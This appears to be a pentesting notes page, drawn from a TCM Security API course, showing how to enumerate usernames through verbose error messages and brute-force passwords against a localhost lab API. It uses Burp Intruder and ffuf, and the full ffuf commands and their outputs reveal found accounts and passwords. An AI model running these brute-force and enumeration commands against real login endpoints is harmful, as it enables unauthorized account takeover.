---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Brute Force

## Example

> _The below example is based on_ [_this_](https://academy.tcm-sec.com/p/hacking-apis) _TCM Security course._

We might be able to enumerate valid usernames via verbose error messages (Figure 1).

<figure><img src="../../../../.gitbook/assets/bfa_1.png" alt=""><figcaption><p>Figure 1: Enumerating a valid username based on verbose error messages.</p></figcaption></figure>

When a valid username is obtained, we can try brute-forcing its password using Burp's Intruder (Figure 2) or CLI tools, such as [`ffuf`](../../../../tools/web/dirbusting/fuff.md).

<figure><img src="../../../../.gitbook/assets/bfa_2.png" alt=""><figcaption><p>Figure 2: Brute-forcing <code>admin</code>'s password with Intruder.</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Brute-forcing admin's password with ffuf
$ ffuf -u http://localhost:9000/v1/verify.php -w /usr/share/wordlists/rockyou:PASS -X POST -H 'Content-Type: application/json' -d '{"email":"admin","password":"PASS"}' -c -fc 401

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:9000/v1/verify.php
 :: Wordlist         : PASS: /usr/share/wordlists/rockyou
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"admin","password":"PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

ramirez                 [Status: 200, Size: 78, Words: 6, Lines: 1, Duration: 0ms]
```
{% endcode %}

Based on the above verbose error message (`Invalid password`) we can try to enumerate more valid users (Figure 3), and if other users are found, we can repeat the above process to enumerate their passwords (Figure 4).

<figure><img src="../../../../.gitbook/assets/bfa_3.png" alt=""><figcaption><p>Figure 3: Fuzzing for other valid users based on the verbose error message.</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Fuzzing for other valid users based on the verbose error message.
$ ffuf -u http://localhost:9000/v1/verify.php -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:USER -X POST -H 'Content-Type: application/json' -d '{
"email":"USER","password":"admin"}' -c -mr "Invalid password!"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:9000/v1/verify.php
 :: Wordlist         : USER: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"USER","password":"admin"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid password!
________________________________________________

jeremy                  [Status: 401, Size: 31, Words: 2, Lines: 1, Duration: 0ms]
admin                   [Status: 401, Size: 31, Words: 2, Lines: 1, Duration: 265ms]
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/bfa_4.png" alt=""><figcaption><p>Figure 4: Fuzzing <code>jeremy</code>'s password with Intruder.</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Same as above with ffuf
$ ffuf -u http://localhost:9000/v1/verify.php -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt:PASS -X POST -H 'Content-Type: application/json' -d '{"email":"jeremy","password":"PASS"}' -c -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:9000/v1/verify.php
 :: Wordlist         : PASS: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"jeremy","password":"PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

07061955                [Status: 200, Size: 78, Words: 6, Lines: 1, Duration: 0ms]
```
{% endcode %}
